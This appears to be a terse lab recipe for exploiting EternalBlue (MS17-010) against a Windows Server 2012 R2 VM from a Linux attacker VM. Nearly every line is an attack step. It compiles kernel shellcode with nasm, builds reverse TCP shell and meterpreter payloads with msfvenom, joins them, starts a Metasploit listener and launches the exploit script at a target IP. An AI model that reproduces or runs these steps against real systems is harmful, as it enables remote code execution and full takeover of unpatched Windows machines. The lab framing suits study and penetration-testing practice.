# Links
https://gist.github.com/worawit/05105fce9e126ac9c85325f0b05d6501#file-eternalblue_x64_kshellcode-asm

# Tools
NASM - http://www.nasm.us/
Python v2.7 - https://www.python.org/download/releases/2.7/
Metasploit Framework - https://github.com/rapid7/metasploit-framework

# Victim VM
Windows Server 2012 R2

# Attacker VM
GNU/Linux Debian x64

# Compile shellcode
nasm -f bin eternalblue_x64_kshellcode.asm
nasm -f bin eternalblue_x86_kshellcode.asm


# Gen shellcode with msf
msfvenom -p windows/x64/shell/reverse_tcp -f raw -o shell_msf.bin EXITFUNC=thread LHOST=192.168.56.1 LPORT=4444
msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o meterpreter_msf.bin EXITFUNC=thread LHOST=192.168.56.1 LPORT=4444

cat eternalblue_x64_kshellcode shell_msf.bin > reverse_shell.bin
cat eternalblue_x64_kshellcode meterpreter_msf.bin > meterpreter.bin

# Execute listener on attacker vm
msf > use exploit/multi/handler
msf exploit(handler) > set ExitOnSession false
msf exploit(handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf exploit(handler) > set EXITFUNC thread
msf exploit(handler) > set LHOST 0.0.0.0
msf exploit(handler) > set LPORT 4444
msf exploit(handler) > exploit -j

# Execute exploit with reverse_shell payload
python eternalblue8_exploit.py <ip_target> reverse_shell.bin 500

# Execute exploit with meterpreter payload
python eternalblue8_exploit.py <ip_target> meterpreter.bin 200